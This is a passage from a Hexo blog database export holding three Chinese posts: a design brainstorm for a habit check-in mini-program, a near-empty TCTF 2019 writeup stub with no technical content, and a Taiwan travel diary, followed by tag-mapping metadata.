圈子部分\n\n每个人在圈子中，养成各自的习惯，按任务打卡。\n\n思考是否加入排名，但引入排名会出现几个问题：\n\n- 排名机制复杂\n    - 日常和周常的任务，怎么混在一起排名？\n        - 换算成百分比或者使用上周的排名【不好】\n    - 任务数量不同的人怎么排高低\n- 提高排名的方式不积极\n    - 若漏签或者断签，再想获得高排名只能通过等待他人断签。\n        - 可以把排名周期缩短，尽快度过这个阶段\n\n加入社交圈以后有什么好处呢？\n\n> 用户完成目标【全签、打卡满50天等】，可以让其他人知道。\n\n我们会发现，其实排名多少，没有达成成就并广播这一结果重要。其他人可能并不关心你打卡几次，更关心的是自己在不在全勤的周报名单中？ \n\n**所以干脆去掉排名好了。** 改为上周达成全勤的人的周报形式。\n\n嗯笔记：\n\n![](https://md.byr.moe/uploads/upload_5b89df2cff809e5cb21220dff6b84c9e.png)\n\n在社交圈里也可以看大家打卡打的咋样了hh，我觉得有一定的社交性。但是这个设计说实话还挺麻烦的，感觉不一定会有很多人需要如此的定制性，总之就是带着小朋友体验下过程，顺便学一学前端和小程序开发。\n\n\n\n","source":"_posts/mina-dev-0.md","raw":"---\ntitle: 【研发】天天种树小程序 1 起步+调研\ndate: 2019-03-21 01:18:58\ntags:\n- 小程序\n- 天天种树\n---\n看了一段时间的前端知识，想写点什么东西练练手，正好之前和我家小朋友聊到了有个强定制的打卡种树app的需求，趁着现在不是很忙【其实事情还挺多的】，一起完整的做个产品练练手。\n\n<!-- more -->\n\n## 已有工具调研\n\n### 小日常\n\n我们想要做一个，强调圈子的打卡app，强调**一起**努力养成好习惯的过程。市面上已有的产品我们都去看了看，发现最好用的个人打卡app叫，小日常。\n\n![](https://md.byr.moe/uploads/upload_732eee40e1b03bd6c78aa330d55b0dc1.png)\n\n![](https://md.byr.moe/uploads/upload_fbea1c119a252f0bdac5c4e024ebace3.png)\n\n几乎满足了 个人打卡养成习惯的所有需求，我实在想不出来还可以添加什么功能，或是删除什么功能了。。推荐有需要的同学试用一下，google play和app store都有上架。\n\n### 有圈子的打卡工具\n\n我们需要的是有一个圈子，强调共同进步打卡。于是又在app商城和小程序列表里找了找，试用了其他的打卡工具。发现也有强调社交的打卡软件，但是就非常杂乱，比如\n\n- 内嵌了社区\n- UI设计的十分垃圾。。我找不到咋打卡。。\n- 圈子定制性不够强，所有人只能从同一天开始，共同完成一个任务。\n\n没办法了，作为程序员只能自己写了哈哈哈\n\n---\n\n## 头脑风暴\n\n### 打卡部分\n\n![](https://md.byr.moe/uploads/upload_a2b74b37618c03b610f5c5240e446513.png)\n\n说来惭愧，准备直接看看小日常有什么功能，删减删减。。我觉得人家做的挺好的。。\n\n当然还想考虑一下，日常任务/周常任务/每周哪几天做，哪几个任务设计方式更好。\n\n仅包含打卡的话，能够给予用户的正反馈大概有如下几点：\n\n- 打卡后的交互：数字增加、好的动画\n- 完成所有的任务给予奖励：卡片\n- 累计多长时间后有特殊提示，或者临近的count down\n\n### 圈子部分\n\n每个人在圈子中，养成各自的习惯，按任务打卡。\n\n思考是否加入排名，但引入排名会出现几个问题：\n\n- 排名机制复杂\n    - 日常和周常的任务，怎么混在一起排名？\n        - 换算成百分比或者使用上周的排名【不好】\n    - 任务数量不同的人怎么排高低\n- 提高排名的方式不积极\n    - 若漏签或者断签，再想获得高排名只能通过等待他人断签。\n        - 可以把排名周期缩短，尽快度过这个阶段\n\n加入社交圈以后有什么好处呢？\n\n> 用户完成目标【全签、打卡满50天等】，可以让其他人知道。\n\n我们会发现，其实排名多少，没有达成成就并广播这一结果重要。其他人可能并不关心你打卡几次，更关心的是自己在不在全勤的周报名单中？ \n\n**所以干脆去掉排名好了。** 改为上周达成全勤的人的周报形式。\n\n嗯笔记：\n\n![](https://md.byr.moe/uploads/upload_5b89df2cff809e5cb21220dff6b84c9e.png)\n\n在社交圈里也可以看大家打卡打的咋样了hh，我觉得有一定的社交性。但是这个设计说实话还挺麻烦的，感觉不一定会有很多人需要如此的定制性，总之就是带着小朋友体验下过程，顺便学一学前端和小程序开发。\n\n\n\n","slug":"mina-dev-0","published":1,"updated":"2020-02-19T07:30:08.116Z","_id":"ck6rlh7u4001f21vwps0qakjn","comments":1,"layout":"post","photos":[],"link":"","content":"<p>看了一段时间的前端知识，想写点什么东西练练手，正好之前和我家小朋友聊到了有个强定制的打卡种树app的需求，趁着现在不是很忙【其实事情还挺多的】，一起完整的做个产品练练手。</p>\n<a id=\"more\"></a>\n<h2 id=\"已有工具调研\"><a href=\"#已有工具调研\" class=\"headerlink\" title=\"已有工具调研\"></a>已有工具调研</h2><h3 id=\"小日常\"><a href=\"#小日常\" class=\"headerlink\" title=\"小日常\"></a>小日常</h3><p>我们想要做一个，强调圈子的打卡app，强调<strong>一起</strong>努力养成好习惯的过程。市面上已有的产品我们都去看了看，发现最好用的个人打卡app叫，小日常。</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_732eee40e1b03bd6c78aa330d55b0dc1.png\" alt></p>\n<p><img src=\"https://md.byr.moe/uploads/upload_fbea1c119a252f0bdac5c4e024ebace3.png\" alt></p>\n<p>几乎满足了 个人打卡养成习惯的所有需求，我实在想不出来还可以添加什么功能，或是删除什么功能了。。推荐有需要的同学试用一下，google play和app store都有上架。</p>\n<h3 id=\"有圈子的打卡工具\"><a href=\"#有圈子的打卡工具\" class=\"headerlink\" title=\"有圈子的打卡工具\"></a>有圈子的打卡工具</h3><p>我们需要的是有一个圈子，强调共同进步打卡。于是又在app商城和小程序列表里找了找，试用了其他的打卡工具。发现也有强调社交的打卡软件，但是就非常杂乱，比如</p>\n<ul>\n<li>内嵌了社区</li>\n<li>UI设计的十分垃圾。。我找不到咋打卡。。</li>\n<li>圈子定制性不够强，所有人只能从同一天开始，共同完成一个任务。</li>\n</ul>\n<p>没办法了，作为程序员只能自己写了哈哈哈</p>\n<hr>\n<h2 id=\"头脑风暴\"><a href=\"#头脑风暴\" class=\"headerlink\" title=\"头脑风暴\"></a>头脑风暴</h2><h3 id=\"打卡部分\"><a href=\"#打卡部分\" class=\"headerlink\" title=\"打卡部分\"></a>打卡部分</h3><p><img src=\"https://md.byr.moe/uploads/upload_a2b74b37618c03b610f5c5240e446513.png\" alt></p>\n<p>说来惭愧，准备直接看看小日常有什么功能，删减删减。。我觉得人家做的挺好的。。</p>\n<p>当然还想考虑一下，日常任务/周常任务/每周哪几天做，哪几个任务设计方式更好。</p>\n<p>仅包含打卡的话，能够给予用户的正反馈大概有如下几点：</p>\n<ul>\n<li>打卡后的交互：数字增加、好的动画</li>\n<li>完成所有的任务给予奖励：卡片</li>\n<li>累计多长时间后有特殊提示，或者临近的count down</li>\n</ul>\n<h3 id=\"圈子部分\"><a href=\"#圈子部分\" class=\"headerlink\" title=\"圈子部分\"></a>圈子部分</h3><p>每个人在圈子中，养成各自的习惯，按任务打卡。</p>\n<p>思考是否加入排名，但引入排名会出现几个问题：</p>\n<ul>\n<li>排名机制复杂<ul>\n<li>日常和周常的任务，怎么混在一起排名？<ul>\n<li>换算成百分比或者使用上周的排名【不好】</li>\n</ul>\n</li>\n<li>任务数量不同的人怎么排高低</li>\n</ul>\n</li>\n<li>提高排名的方式不积极<ul>\n<li>若漏签或者断签，再想获得高排名只能通过等待他人断签。<ul>\n<li>可以把排名周期缩短，尽快度过这个阶段</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>加入社交圈以后有什么好处呢？</p>\n<blockquote>\n<p>用户完成目标【全签、打卡满50天等】，可以让其他人知道。</p>\n</blockquote>\n<p>我们会发现，其实排名多少，没有达成成就并广播这一结果重要。其他人可能并不关心你打卡几次，更关心的是自己在不在全勤的周报名单中？ </p>\n<p><strong>所以干脆去掉排名好了。</strong> 改为上周达成全勤的人的周报形式。</p>\n<p>嗯笔记：</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_5b89df2cff809e5cb21220dff6b84c9e.png\" alt></p>\n<p>在社交圈里也可以看大家打卡打的咋样了hh，我觉得有一定的社交性。但是这个设计说实话还挺麻烦的，感觉不一定会有很多人需要如此的定制性，总之就是带着小朋友体验下过程，顺便学一学前端和小程序开发。</p>\n","site":{"data":{}},"excerpt":"<p>看了一段时间的前端知识，想写点什么东西练练手，正好之前和我家小朋友聊到了有个强定制的打卡种树app的需求，趁着现在不是很忙【其实事情还挺多的】，一起完整的做个产品练练手。</p>","more":"<h2 id=\"已有工具调研\"><a href=\"#已有工具调研\" class=\"headerlink\" title=\"已有工具调研\"></a>已有工具调研</h2><h3 id=\"小日常\"><a href=\"#小日常\" class=\"headerlink\" title=\"小日常\"></a>小日常</h3><p>我们想要做一个，强调圈子的打卡app，强调<strong>一起</strong>努力养成好习惯的过程。市面上已有的产品我们都去看了看，发现最好用的个人打卡app叫，小日常。</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_732eee40e1b03bd6c78aa330d55b0dc1.png\" alt></p>\n<p><img src=\"https://md.byr.moe/uploads/upload_fbea1c119a252f0bdac5c4e024ebace3.png\" alt></p>\n<p>几乎满足了 个人打卡养成习惯的所有需求，我实在想不出来还可以添加什么功能，或是删除什么功能了。。推荐有需要的同学试用一下，google play和app store都有上架。</p>\n<h3 id=\"有圈子的打卡工具\"><a href=\"#有圈子的打卡工具\" class=\"headerlink\" title=\"有圈子的打卡工具\"></a>有圈子的打卡工具</h3><p>我们需要的是有一个圈子，强调共同进步打卡。于是又在app商城和小程序列表里找了找，试用了其他的打卡工具。发现也有强调社交的打卡软件，但是就非常杂乱，比如</p>\n<ul>\n<li>内嵌了社区</li>\n<li>UI设计的十分垃圾。。我找不到咋打卡。。</li>\n<li>圈子定制性不够强，所有人只能从同一天开始，共同完成一个任务。</li>\n</ul>\n<p>没办法了，作为程序员只能自己写了哈哈哈</p>\n<hr>\n<h2 id=\"头脑风暴\"><a href=\"#头脑风暴\" class=\"headerlink\" title=\"头脑风暴\"></a>头脑风暴</h2><h3 id=\"打卡部分\"><a href=\"#打卡部分\" class=\"headerlink\" title=\"打卡部分\"></a>打卡部分</h3><p><img src=\"https://md.byr.moe/uploads/upload_a2b74b37618c03b610f5c5240e446513.png\" alt></p>\n<p>说来惭愧，准备直接看看小日常有什么功能，删减删减。。我觉得人家做的挺好的。。</p>\n<p>当然还想考虑一下，日常任务/周常任务/每周哪几天做，哪几个任务设计方式更好。</p>\n<p>仅包含打卡的话，能够给予用户的正反馈大概有如下几点：</p>\n<ul>\n<li>打卡后的交互：数字增加、好的动画</li>\n<li>完成所有的任务给予奖励：卡片</li>\n<li>累计多长时间后有特殊提示，或者临近的count down</li>\n</ul>\n<h3 id=\"圈子部分\"><a href=\"#圈子部分\" class=\"headerlink\" title=\"圈子部分\"></a>圈子部分</h3><p>每个人在圈子中，养成各自的习惯，按任务打卡。</p>\n<p>思考是否加入排名，但引入排名会出现几个问题：</p>\n<ul>\n<li>排名机制复杂<ul>\n<li>日常和周常的任务，怎么混在一起排名？<ul>\n<li>换算成百分比或者使用上周的排名【不好】</li>\n</ul>\n</li>\n<li>任务数量不同的人怎么排高低</li>\n</ul>\n</li>\n<li>提高排名的方式不积极<ul>\n<li>若漏签或者断签，再想获得高排名只能通过等待他人断签。<ul>\n<li>可以把排名周期缩短，尽快度过这个阶段</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>加入社交圈以后有什么好处呢？</p>\n<blockquote>\n<p>用户完成目标【全签、打卡满50天等】，可以让其他人知道。</p>\n</blockquote>\n<p>我们会发现，其实排名多少，没有达成成就并广播这一结果重要。其他人可能并不关心你打卡几次，更关心的是自己在不在全勤的周报名单中？ </p>\n<p><strong>所以干脆去掉排名好了。</strong> 改为上周达成全勤的人的周报形式。</p>\n<p>嗯笔记：</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_5b89df2cff809e5cb21220dff6b84c9e.png\" alt></p>\n<p>在社交圈里也可以看大家打卡打的咋样了hh，我觉得有一定的社交性。但是这个设计说实话还挺麻烦的，感觉不一定会有很多人需要如此的定制性，总之就是带着小朋友体验下过程，顺便学一学前端和小程序开发。</p>"},{"title":"【writeup】tctf2019-quals","date":"2019-03-22T19:45:13.000Z","_content":"\n新年开赛第一场！本场是作为 [emmmm](https://ctftime.org/team/55193) 战队的成员和大家一起打的\\>\\_<，我们是来自中国科技大学&北京邮电大学&北京理工大学&哈尔滨工业大学的一群有爱的小伙伴哈哈哈。PS：郑老太强了orz\n\n本次比赛题目十分有难度，这里是web和crypto的较详细wp。\n\n<!-- more -->\n\n然后我就懒得写了，挺胸！\n\n","source":"_posts/writeup-tctf2019-quals.md","raw":"---\ntitle: 【writeup】tctf2019-quals\ndate: 2019-03-23 03:45:13\ntags:\n- writeup\n- ctf\n- 天枢\n---\n\n新年开赛第一场！本场是作为 [emmmm](https://ctftime.org/team/55193) 战队的成员和大家一起打的\\>\\_<，我们是来自中国科技大学&北京邮电大学&北京理工大学&哈尔滨工业大学的一群有爱的小伙伴哈哈哈。PS：郑老太强了orz\n\n本次比赛题目十分有难度，这里是web和crypto的较详细wp。\n\n<!-- more -->\n\n然后我就懒得写了，挺胸！\n\n","slug":"writeup-tctf2019-quals","published":1,"updated":"2020-02-19T07:30:29.441Z","_id":"ck6rlh7u7001q21vwiovjqgbl","comments":1,"layout":"post","photos":[],"link":"","content":"<p>新年开赛第一场！本场是作为 <a href=\"https://ctftime.org/team/55193\" target=\"_blank\" rel=\"noopener\">emmmm</a> 战队的成员和大家一起打的>_&lt;，我们是来自中国科技大学&amp;北京邮电大学&amp;北京理工大学&amp;哈尔滨工业大学的一群有爱的小伙伴哈哈哈。PS：郑老太强了orz</p>\n<p>本次比赛题目十分有难度，这里是web和crypto的较详细wp。</p>\n<a id=\"more\"></a>\n<p>然后我就懒得写了，挺胸！</p>\n","site":{"data":{}},"excerpt":"<p>新年开赛第一场！本场是作为 <a href=\"https://ctftime.org/team/55193\" target=\"_blank\" rel=\"noopener\">emmmm</a> 战队的成员和大家一起打的>_&lt;，我们是来自中国科技大学&amp;北京邮电大学&amp;北京理工大学&amp;哈尔滨工业大学的一群有爱的小伙伴哈哈哈。PS：郑老太强了orz</p>\n<p>本次比赛题目十分有难度，这里是web和crypto的较详细wp。</p>","more":"<p>然后我就懒得写了，挺胸！</p>"},{"title":"台湾半岛游-其零","date":"2019-02-27T17:09:50.000Z","_content":"> Aloha，我是西塞尔，在开始之前先和大家说一声过年好！猪年到了，祝愿大家在新的一年里，和佩奇一样开开心心。\n\n汗，无论你之前知不知道，我在一月底的时候去了台湾玩，我都要感叹一下，没想到这趟说走就走的旅行竟然真的出发了。从台湾回来已经一周了，天天通宵熬夜剪好了旅行速报【偷笑】，理清了旅行流水账，现在终于可以坐下来慢慢写游记了！\n\n<!-- more -->\n\n我于2019.01.21，和其他四位小伙伴一起从河北正定机场出发，行程共计十天，2019.01.31大家从台北起飞，各回各家各找各妈。最后分别之际，大家还纷纷嚎着\"时间不够\"，\"没玩够十五天好亏\"等等hhh\n\n四位小伙伴（小黑、头哥、颖帝、顺总）都是我的大学同班同学，平时关系甚好，但也未曾想到突然有一天能和大家去了这么远的地方玩！\n\n时间回到去年的12月25日圣诞节，小黑在班群里问了句要不要去台湾玩，当时想着混入其中，把目的地改成去北边划个雪好啦，没想到上了贼船。。\n\n![](https://md.byr.moe/uploads/upload_788e45f4519df52e27c264834e231def.png)\n\n> 去办证的早上hhh\n\n![](https://md.byr.moe/uploads/upload_bb3e4b7e63f703a46d84d745a1e0e1cc.png)\n\n12.26大家聚在一起线下开了个会，商讨了大致的行程，查了需要办何证件，然后转天我们就去办通行证了，因为办完通行证之后，还要办理入台证明，类似【护照+签证】这样的关系。时间十分紧张，这两个加起来要办十多天。。中间还夹着元旦假期。\n\n之后就是一边办着这个证件，一边订行程、订酒店，中间出现了诸如\n\n- 户口不在北京，办证麻烦\n- 下周一就出门了，周三告诉我材料有问题没下签\n- 咕咕飞和咕咕黑三天两头就回家，不好好订airbnb\n- 去程机票订的太晚所以很贵，查了好几个小时最后曲线救国从石家庄出发\n- 都有期末考试！\n- 好几个人在外面实习！\n- 订房的时候犹豫，结果差点错过一个实惠的大房子【那天差点生气。。】\n\n等等问题，但不负众望。。我们几个上班的上班，搬砖的板砖，最终旅行还是说走就走了！\n\n> 出门前的大致行程\n\n![](https://md.byr.moe/uploads/upload_b74b05cc381b86251d86a225571f6948.png)\n\n> 出门前的一些备忘hhh\n\n![](https://md.byr.moe/uploads/upload_61a43ebafd6eb5da25c90cb02dad968d.png)\n\n> 各地\n\n![](https://md.byr.moe/uploads/upload_aa2a9d68e0a6e224f830445d544cd8e0.png)\n\n> 准备的时间hhh\n\n![](https://md.byr.moe/uploads/upload_14ecd6663659b34c1151b6c5882babe8.png)\n\n一路上的行程十分有意思，拍了很多也录了很多，在之后的一段时间里会缓慢的把点点滴滴分享给大家。\n\n\n\n","source":"_posts/travel-taiwan-0.md","raw":"---\ntitle: 台湾半岛游-其零\ndate: 2019-02-28 01:09:50\ntags:\n- 台湾\n- 游记\n---\n> Aloha，我是西塞尔，在开始之前先和大家说一声过年好！猪年到了，祝愿大家在新的一年里，和佩奇一样开开心心。\n\n汗，无论你之前知不知道，我在一月底的时候去了台湾玩，我都要感叹一下，没想到这趟说走就走的旅行竟然真的出发了。从台湾回来已经一周了，天天通宵熬夜剪好了旅行速报【偷笑】，理清了旅行流水账，现在终于可以坐下来慢慢写游记了！\n\n<!-- more -->\n\n我于2019.01.21，和其他四位小伙伴一起从河北正定机场出发，行程共计十天，2019.01.31大家从台北起飞，各回各家各找各妈。最后分别之际，大家还纷纷嚎着\"时间不够\"，\"没玩够十五天好亏\"等等hhh\n\n四位小伙伴（小黑、头哥、颖帝、顺总）都是我的大学同班同学，平时关系甚好，但也未曾想到突然有一天能和大家去了这么远的地方玩！\n\n时间回到去年的12月25日圣诞节，小黑在班群里问了句要不要去台湾玩，当时想着混入其中，把目的地改成去北边划个雪好啦，没想到上了贼船。。\n\n![](https://md.byr.moe/uploads/upload_788e45f4519df52e27c264834e231def.png)\n\n> 去办证的早上hhh\n\n![](https://md.byr.moe/uploads/upload_bb3e4b7e63f703a46d84d745a1e0e1cc.png)\n\n12.26大家聚在一起线下开了个会，商讨了大致的行程，查了需要办何证件，然后转天我们就去办通行证了，因为办完通行证之后，还要办理入台证明，类似【护照+签证】这样的关系。时间十分紧张，这两个加起来要办十多天。。中间还夹着元旦假期。\n\n之后就是一边办着这个证件，一边订行程、订酒店，中间出现了诸如\n\n- 户口不在北京，办证麻烦\n- 下周一就出门了，周三告诉我材料有问题没下签\n- 咕咕飞和咕咕黑三天两头就回家，不好好订airbnb\n- 去程机票订的太晚所以很贵，查了好几个小时最后曲线救国从石家庄出发\n- 都有期末考试！\n- 好几个人在外面实习！\n- 订房的时候犹豫，结果差点错过一个实惠的大房子【那天差点生气。。】\n\n等等问题，但不负众望。。我们几个上班的上班，搬砖的板砖，最终旅行还是说走就走了！\n\n> 出门前的大致行程\n\n![](https://md.byr.moe/uploads/upload_b74b05cc381b86251d86a225571f6948.png)\n\n> 出门前的一些备忘hhh\n\n![](https://md.byr.moe/uploads/upload_61a43ebafd6eb5da25c90cb02dad968d.png)\n\n> 各地\n\n![](https://md.byr.moe/uploads/upload_aa2a9d68e0a6e224f830445d544cd8e0.png)\n\n> 准备的时间hhh\n\n![](https://md.byr.moe/uploads/upload_14ecd6663659b34c1151b6c5882babe8.png)\n\n一路上的行程十分有意思，拍了很多也录了很多，在之后的一段时间里会缓慢的把点点滴滴分享给大家。\n\n\n\n","slug":"travel-taiwan-0","published":1,"updated":"2020-02-18T14:02:01.256Z","_id":"ck6ryi94m00037vvwnxkm8z4d","comments":1,"layout":"post","photos":[],"link":"","content":"<blockquote>\n<p>Aloha，我是西塞尔，在开始之前先和大家说一声过年好！猪年到了，祝愿大家在新的一年里，和佩奇一样开开心心。</p>\n</blockquote>\n<p>汗，无论你之前知不知道，我在一月底的时候去了台湾玩，我都要感叹一下，没想到这趟说走就走的旅行竟然真的出发了。从台湾回来已经一周了，天天通宵熬夜剪好了旅行速报【偷笑】，理清了旅行流水账，现在终于可以坐下来慢慢写游记了！</p>\n<a id=\"more\"></a>\n<p>我于2019.01.21，和其他四位小伙伴一起从河北正定机场出发，行程共计十天，2019.01.31大家从台北起飞，各回各家各找各妈。最后分别之际，大家还纷纷嚎着”时间不够”，”没玩够十五天好亏”等等hhh</p>\n<p>四位小伙伴（小黑、头哥、颖帝、顺总）都是我的大学同班同学，平时关系甚好，但也未曾想到突然有一天能和大家去了这么远的地方玩！</p>\n<p>时间回到去年的12月25日圣诞节，小黑在班群里问了句要不要去台湾玩，当时想着混入其中，把目的地改成去北边划个雪好啦，没想到上了贼船。。</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_788e45f4519df52e27c264834e231def.png\" alt></p>\n<blockquote>\n<p>去办证的早上hhh</p>\n</blockquote>\n<p><img src=\"https://md.byr.moe/uploads/upload_bb3e4b7e63f703a46d84d745a1e0e1cc.png\" alt></p>\n<p>12.26大家聚在一起线下开了个会，商讨了大致的行程，查了需要办何证件，然后转天我们就去办通行证了，因为办完通行证之后，还要办理入台证明，类似【护照+签证】这样的关系。时间十分紧张，这两个加起来要办十多天。。中间还夹着元旦假期。</p>\n<p>之后就是一边办着这个证件，一边订行程、订酒店，中间出现了诸如</p>\n<ul>\n<li>户口不在北京，办证麻烦</li>\n<li>下周一就出门了，周三告诉我材料有问题没下签</li>\n<li>咕咕飞和咕咕黑三天两头就回家，不好好订airbnb</li>\n<li>去程机票订的太晚所以很贵，查了好几个小时最后曲线救国从石家庄出发</li>\n<li>都有期末考试！</li>\n<li>好几个人在外面实习！</li>\n<li>订房的时候犹豫，结果差点错过一个实惠的大房子【那天差点生气。。】</li>\n</ul>\n<p>等等问题，但不负众望。。我们几个上班的上班，搬砖的板砖，最终旅行还是说走就走了！</p>\n<blockquote>\n<p>出门前的大致行程</p>\n</blockquote>\n<p><img src=\"https://md.byr.moe/uploads/upload_b74b05cc381b86251d86a225571f6948.png\" alt></p>\n<blockquote>\n<p>出门前的一些备忘hhh</p>\n</blockquote>\n<p><img src=\"https://md.byr.moe/uploads/upload_61a43ebafd6eb5da25c90cb02dad968d.png\" alt></p>\n<blockquote>\n<p>各地</p>\n</blockquote>\n<p><img src=\"https://md.byr.moe/uploads/upload_aa2a9d68e0a6e224f830445d544cd8e0.png\" alt></p>\n<blockquote>\n<p>准备的时间hhh</p>\n</blockquote>\n<p><img src=\"https://md.byr.moe/uploads/upload_14ecd6663659b34c1151b6c5882babe8.png\" alt></p>\n<p>一路上的行程十分有意思，拍了很多也录了很多，在之后的一段时间里会缓慢的把点点滴滴分享给大家。</p>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p>Aloha，我是西塞尔，在开始之前先和大家说一声过年好！猪年到了，祝愿大家在新的一年里，和佩奇一样开开心心。</p>\n</blockquote>\n<p>汗，无论你之前知不知道，我在一月底的时候去了台湾玩，我都要感叹一下，没想到这趟说走就走的旅行竟然真的出发了。从台湾回来已经一周了，天天通宵熬夜剪好了旅行速报【偷笑】，理清了旅行流水账，现在终于可以坐下来慢慢写游记了！</p>","more":"<p>我于2019.01.21，和其他四位小伙伴一起从河北正定机场出发，行程共计十天，2019.01.31大家从台北起飞，各回各家各找各妈。最后分别之际，大家还纷纷嚎着”时间不够”，”没玩够十五天好亏”等等hhh</p>\n<p>四位小伙伴（小黑、头哥、颖帝、顺总）都是我的大学同班同学，平时关系甚好，但也未曾想到突然有一天能和大家去了这么远的地方玩！</p>\n<p>时间回到去年的12月25日圣诞节，小黑在班群里问了句要不要去台湾玩，当时想着混入其中，把目的地改成去北边划个雪好啦，没想到上了贼船。。</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_788e45f4519df52e27c264834e231def.png\" alt></p>\n<blockquote>\n<p>去办证的早上hhh</p>\n</blockquote>\n<p><img src=\"https://md.byr.moe/uploads/upload_bb3e4b7e63f703a46d84d745a1e0e1cc.png\" alt></p>\n<p>12.26大家聚在一起线下开了个会，商讨了大致的行程，查了需要办何证件，然后转天我们就去办通行证了，因为办完通行证之后，还要办理入台证明，类似【护照+签证】这样的关系。时间十分紧张，这两个加起来要办十多天。。中间还夹着元旦假期。</p>\n<p>之后就是一边办着这个证件，一边订行程、订酒店，中间出现了诸如</p>\n<ul>\n<li>户口不在北京，办证麻烦</li>\n<li>下周一就出门了，周三告诉我材料有问题没下签</li>\n<li>咕咕飞和咕咕黑三天两头就回家，不好好订airbnb</li>\n<li>去程机票订的太晚所以很贵，查了好几个小时最后曲线救国从石家庄出发</li>\n<li>都有期末考试！</li>\n<li>好几个人在外面实习！</li>\n<li>订房的时候犹豫，结果差点错过一个实惠的大房子【那天差点生气。。】</li>\n</ul>\n<p>等等问题，但不负众望。。我们几个上班的上班，搬砖的板砖，最终旅行还是说走就走了！</p>\n<blockquote>\n<p>出门前的大致行程</p>\n</blockquote>\n<p><img src=\"https://md.byr.moe/uploads/upload_b74b05cc381b86251d86a225571f6948.png\" alt></p>\n<blockquote>\n<p>出门前的一些备忘hhh</p>\n</blockquote>\n<p><img src=\"https://md.byr.moe/uploads/upload_61a43ebafd6eb5da25c90cb02dad968d.png\" alt></p>\n<blockquote>\n<p>各地</p>\n</blockquote>\n<p><img src=\"https://md.byr.moe/uploads/upload_aa2a9d68e0a6e224f830445d544cd8e0.png\" alt></p>\n<blockquote>\n<p>准备的时间hhh</p>\n</blockquote>\n<p><img src=\"https://md.byr.moe/uploads/upload_14ecd6663659b34c1151b6c5882babe8.png\" alt></p>\n<p>一路上的行程十分有意思，拍了很多也录了很多，在之后的一段时间里会缓慢的把点点滴滴分享给大家。</p>"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"ck6rlh7t7000121vww89w9l3v","tag_id":"ck6rlh7td000321vwtswdwr8w","_id":"ck6rlh7tl000c21vwm8i9u2vw"},{"post_id":"ck6rlh7t7000121vww89w9l3v","tag_id":"ck6rlh7ti000721vwk33xxk3k","_id":"ck6rlh7tl000d21vwdeoyt9l8"},{"post_id":"ck6rlh7t7000121vww89w9l3v","tag_id":"ck6rlh7tk000a21vwu9camvh9","_id":"ck6rlh7tl000f21vwjhx0s9qy"},{"post_id":"ck6rlh7tb000221vw34sw5vrj","tag_id":"ck6rlh7tl000b21vw2y8m1t8y","_id":"ck6rlh7tm000h21vw9zcn7fl1"},{"post_id":"ck6rlh7tb000221vw34sw5vrj","tag_id":"ck6rlh7tl000e21vwa5ed4wic","_id":"ck6rlh7tm000i21vwirelhd1y"},{"post_id":"ck6rlh7te000421vwte4d4y0h","tag_id":"ck6rlh7tm000g21vw3lu2xd2m","_id":"ck6rlh7tn000m21vwt2dfvw4f"},{"post_id":"ck6rlh7te000421vwte4d4y0h","tag_id":"ck6rlh7tm000j21vw2ihq7mlv","_id":"ck6rlh7tn000n21vwr6gi7ho3"},{"post_id":"ck6rlh7te000421vwte4d4y0h","tag_id":"ck6rlh7tm000k21vw8j7cfgmd","_id":"ck6rlh7tn000p21vwolodlllk"},{"post_id":"ck6rlh7th000621vwyf7m39az","tag_id":"ck6rlh7tn000q21vwj5hh4zyq","_id":"ck6rlh7tq000y21vwle248ttl"},{"post_id":"ck6rlh7th000621vwyf7m39az","tag_id":"ck6rlh7tk000a21vwu9camvh9","_id":"ck6rlh7tq000z21vw50afd288"},{"post_id":"ck6rlh7th000621vwyf7m39az","tag_id":"ck6rlh7tp000v21vw70n8gpal","_id":"ck6rlh7tq001121vwmt7pyg8s"},{"post_id":"ck6rlh7th000621vwyf7m39az","tag_id":"ck6rlh7td000321vwtswdwr8w","_id":"ck6rlh7tq001221vw3hbz6vj0"},{"post_id":"ck6rlh7th000621vwyf7m39az","tag_id":"ck6rlh7tp000w21vwxgky74k5","_id":"ck6rlh7tq001421vwb4b67n0r"},{"post_id":"ck6rlh7tj000821vw1gncxf48","tag_id":"ck6rlh7tp000x21vw8j9f5h2g","_id":"ck6rlh7tr001521vwvuphewnr"},{"post_id":"ck6rlh7tj000821vw1gncxf48","tag_id":"ck6rlh7tq001021vw0zp3uwvo","_id":"ck6rlh7tr001721vw4li4hylo"},{"post_id":"ck6rlh7tt001a21vwplr7wsgs","tag_id":"ck6rlh7ti000721vwk33xxk3k","_id":"ck6rlh7u3001c21vwrrzr7xf2"},{"post_id":"ck6rlh7tt001a21vwplr7wsgs","tag_id":"ck6rlh7tk000a21vwu9camvh9","_id":"ck6rlh7u4001e21vwwoe7ojpm"},{"post_id":"ck6rlh7tu001b21vw8w6zqc9j","tag_id":"ck6rlh7tn000q21vwj5hh4zyq","_id":"ck6rlh7u5001h21vwm81ma3qy"},{"post_id":"ck6rlh7tu001b21vw8w6zqc9j","tag_id":"ck6rlh7tk000a21vwu9camvh9","_id":"ck6rlh7u5001i21vwf7twhq4a"},{"post_id":"ck6rlh7tu001b21vw8w6zqc9j","tag_id":"ck6rlh7tp000v21vw70n8gpal","_id":"ck6rlh7u5001j21vwlrz07lsc"},{"post_id":"ck6rlh7u4001f21vwps0qakjn","tag_id":"ck6rlh7tq001321vw29agp7oa","_id":"ck6rlh7u5001k21vwmsg3bod5"},{"post_id":"ck6rlh7u4001f21vwps0qakjn","tag_id":"ck6rlh7tr001621vwlle4w9w6","_id":"ck6rlh7u6001l21vw2y09lyjg"},{"post_id":"ck6rlh7u3001d21vwcshe5e70","tag_id":"ck6rlh7u5001g21vwqtndv561","_id":"ck6rlh7u6001m21vwabdc6xke"},{"post_id":"ck6rlh7u3001d21vwcshe5e70","tag_id":"ck6rlh7tm000g21vw3lu2xd2m","_id":"ck6rlh7u6001n21vwdp3doae5"},{"post_id":"ck6rlh7u7001q21vwiovjqgbl","tag_id":"ck6rlh7tk000a21vwu9camvh9","_id":"ck6rlh7u9001s21vwbelguwfl"},{"post_id":"ck6rlh7u7